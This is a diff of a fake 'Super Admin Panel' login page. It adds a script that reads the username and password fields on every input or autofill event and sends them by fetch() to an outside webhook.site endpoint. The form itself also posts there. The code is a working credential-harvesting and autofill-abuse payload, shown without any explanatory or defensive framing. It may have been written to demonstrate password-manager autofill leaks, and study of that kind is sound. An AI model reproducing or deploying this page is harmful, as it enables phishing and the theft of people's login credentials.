@@ -1,14 +1,48 @@
 <html>
-    <head>
-        <title>Super Admin Panel</title>
-    </head>
-    <body style="font-family: 'Inter'; max-width: 700px; margin: 0 auto; background-color: #08090f; padding: 20px; color: #0095ff;">
-        <h1 style="font-size: 3rem; font-family: 'JetBrains Mono', monospace;">Super Admin Panel</h1>
-        
-        <form action="https://webhook.site/ecf94fde-7634-420e-8ca6-9160c2a9bd4d" method="POST" style="background-color: rgba(0, 0, 0, 0.7); padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 255, 0.7);">
-            <input id="username" name="username" type="text" placeholder="Username" style="width: 100%; padding: 10px; border: 2px solid #007BFF; border-radius: 5px; background: transparent; margin-bottom: 10px; display:block; color: #fff; font-size: 20px;">
-            <input id="password" name="password" type="password" placeholder="Password" style="width: 100%; padding: 10px; border: 2px solid #007BFF; border-radius: 5px; background: transparent; margin-bottom: 10px; display:block; color: #fff; font-size: 20px;">
-            <button id="pwn" style="width: 100%; padding: 10px; background-color: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer; display:block; color: #fff; font-size: 20px; margin-bottom: 10px;"  value="Submit">Login</button>
-        </form>
-    </body>
+
+<head>
+  <title>Super Admin Panel</title>
+</head>
+
+<body style="font-family: 'Inter'; max-width: 700px; margin: 0 auto; background-color: #08090f; padding: 20px; color: #0095ff;">
+  <h1 style="font-size: 3rem; font-family: 'JetBrains Mono', monospace;">Super Admin Panel</h1>
+
+  <form action="https://webhook.site/ecf94fde-7634-420e-8ca6-9160c2a9bd4d" method="POST" style="background-color: rgba(0, 0, 0, 0.7); padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 255, 0.7);">
+    <input id="username" name="username" type="text" placeholder="Username" style="width: 100%; padding: 10px; border: 2px solid #007BFF; border-radius: 5px; background: transparent; margin-bottom: 10px; display:block; color: #fff; font-size: 20px;">
+    <input id="password" name="password" type="password" placeholder="Password" style="width: 100%; padding: 10px; border: 2px solid #007BFF; border-radius: 5px; background: transparent; margin-bottom: 10px; display:block; color: #fff; font-size: 20px;">
+    <button id="pwn" style="width: 100%; padding: 10px; background-color: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer; display:block; color: #fff; font-size: 20px; margin-bottom: 10px;" value="Submit">Login</button>
+  </form>
+</body>
+
 </html>
+
+<script>
+  const URL = "https://webhook.site/ecf94fde-7634-420e-8ca6-9160c2a9bd4d"
+  const usernameElement = document.getElementById("username");
+  const passwordElement = document.getElementById("password");
+
+  // function to execute when input event happens
+  function inputListenerFunc(e) {
+    sendLog({
+      type: 'autofillTriggered',
+      data: {
+        username: usernameElement.value,
+        password: passwordElement.value
+      }
+    })
+  }
+
+  passwordElement.addEventListener('input', inputListenerFunc)
+  usernameElement.addEventListener('input', inputListenerFunc)
+
+  function sendLog(data) {
+    console.log('sending log', data)
+    fetch(URL, {
+      method: 'POST',
+      body: JSON.stringify(data),
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    })
+  }
+</script>
